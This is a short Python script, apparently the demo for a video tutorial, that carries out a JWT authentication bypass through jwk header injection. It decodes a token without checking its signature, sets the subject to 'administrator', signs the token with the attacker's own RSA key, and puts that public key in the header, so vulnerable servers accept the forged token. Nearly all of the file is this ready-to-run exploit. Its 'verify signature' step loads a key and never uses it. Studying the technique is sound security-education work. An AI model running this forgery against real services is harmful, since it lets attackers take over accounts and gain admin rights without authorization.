# Demo script for 'JWT Authentication Bypass via jwk Header Injection' video: https://youtu.be/t-RfzyW0iqA
import jwt
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Step 1: Take a JWT and decode it
token = 'INSERT_TOKEN_HERE'

# Step 2: Verify the JWT signature
with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

# Step 3: Decode the JWT
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}")
decoded_header = jwt.get_unverified_header(token)
print(f"Decoded header: {decoded_header}\n")

# Step 4: Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"Modified token: {decoded_token}\n")

# Step 5: Sign the modified JWT using your RSA private key and embed the public key in the JWK header
with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Extract the necessary information from the private key
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

# Build the JWK header
jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
}

# Step 6: Generate the modified token
modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jwk': jwk, 'kid': decoded_header['kid']})

# Print the modified token header
print(f"Modified header: {jwt.get_unverified_header(modified_token)}\n")

# Print the final token
print("Final Token: " + modified_token)